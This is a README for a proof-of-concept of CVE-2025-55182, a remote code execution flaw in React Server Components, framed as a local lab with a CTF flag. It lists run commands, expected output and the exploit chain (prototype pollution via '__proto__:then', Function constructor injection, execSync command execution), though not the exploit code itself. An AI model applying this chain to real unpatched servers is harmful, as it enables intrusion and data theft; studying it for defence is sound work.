# CVE-2025-55182 Proof of Concept

Educational demonstration of CVE-2025-55182 RCE in React Server Components.

**Warning:** For educational and authorized testing only.

## Quick Start

```bash
# 1. Install and start vulnerable app
cd poc/vuln-app
npm install --legacy-peer-deps
npm run dev

# 2. Run exploit (in another terminal)
node poc/exploit/exploit.js http://localhost:5432
```

## Expected Output

```
[*] Stage 1: Testing command execution with "id"...
[+] RCE SUCCESSFUL!
[+] Command output: uid=502(AKJ) gid=20(staff)...

[*] Stage 2: Extracting FLAG from environment...
[+] FLAG EXTRACTED!
[+] FLAG: CTF{cve_2025_55182_rce_prototype_pollution}
```

## What It Does

The exploit:
1. Triggers prototype pollution via `$1:__proto__:then`
2. Injects Function constructor through `_formData.get`
3. Executes arbitrary OS commands via `child_process.execSync()`
4. Extracts FLAG from environment variables
5. Returns results in error digest field

## Vulnerable App

- **Next.js:** 15.0.0 (vulnerable)
- **React:** 19.0.0 (vulnerable)
- **Port:** 5432
- **FLAG:** `CTF{cve_2025_55182_rce_prototype_pollution}`

## References

- React Advisory: https://react.dev/blog/2025/12/03/critical-security-vulnerability
- Fix Commit: https://github.com/facebook/react/commit/7dc903cd29
- CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182
